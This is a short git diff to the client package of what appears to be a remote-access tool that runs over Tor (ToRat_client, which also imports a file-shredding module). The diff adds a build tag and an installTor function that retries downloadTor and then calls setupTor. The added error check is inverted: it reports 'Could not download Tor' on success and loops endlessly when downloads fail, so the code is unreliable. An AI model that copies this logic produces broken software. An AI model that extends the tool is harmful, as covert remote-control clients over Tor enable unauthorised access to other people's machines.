@@ -1,3 +1,5 @@
+// +build !notor
+
 package client
 
 import (
@@ -14,7 +16,16 @@ import (
 	"github.com/lu4p/ToRat_client/shred"
 )
 
-// TODO: Add option to embed Tor
+func installTor() {
+	for {
+		err := downloadTor()
+		if err == nil {
+			log.Println("Could not download Tor:", err)
+			break
+		}
+	}
+	setupTor()
+}
 
 func downloadTor() error {
 	log.Println("downloadTor")
